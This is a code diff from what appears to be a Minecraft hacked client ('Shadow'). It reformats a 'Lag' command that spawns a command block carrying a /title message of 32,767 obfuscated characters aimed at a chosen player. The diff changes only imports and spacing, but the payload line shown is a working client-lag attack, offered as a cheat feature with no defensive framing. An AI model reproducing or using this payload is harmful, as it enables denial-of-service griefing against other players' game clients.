@@ -4,19 +4,18 @@
 
 package net.shadow.client.feature.command.impl;
 
+import net.minecraft.item.Item;
 import net.minecraft.item.ItemStack;
+import net.minecraft.nbt.StringNbtReader;
+import net.minecraft.network.packet.c2s.play.ChatMessageC2SPacket;
+import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;
 import net.minecraft.util.Identifier;
+import net.minecraft.util.registry.Registry;
 import net.shadow.client.ShadowMain;
 import net.shadow.client.feature.command.Command;
 import net.shadow.client.helper.util.Utils;
 
 import java.util.Objects;
-
-import net.minecraft.item.Item;
-import net.minecraft.nbt.StringNbtReader;
-import net.minecraft.network.packet.c2s.play.ChatMessageC2SPacket;
-import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;
-import net.minecraft.util.registry.Registry;
 
 public class Lag extends Command {
     public Lag() {
@@ -44,7 +43,7 @@ public class Lag extends Command {
         Item item = Registry.ITEM.get(new Identifier("command_block"));
         ItemStack stack = new ItemStack(item, 1);
         try {
-            stack.setNbt(StringNbtReader.parse("{BlockEntityTag:{Command:\"/title " + target + " title {\\\"text\\\":\\\""+"l".repeat(32767)+"\\\",\\\"obfuscated\\\":true}\",powered:0b,auto:1b,conditionMet:1b}}"));
+            stack.setNbt(StringNbtReader.parse("{BlockEntityTag:{Command:\"/title " + target + " title {\\\"text\\\":\\\"" + "l".repeat(32767) + "\\\",\\\"obfuscated\\\":true}\",powered:0b,auto:1b,conditionMet:1b}}"));
         } catch (Exception e) {
             e.printStackTrace();
         }
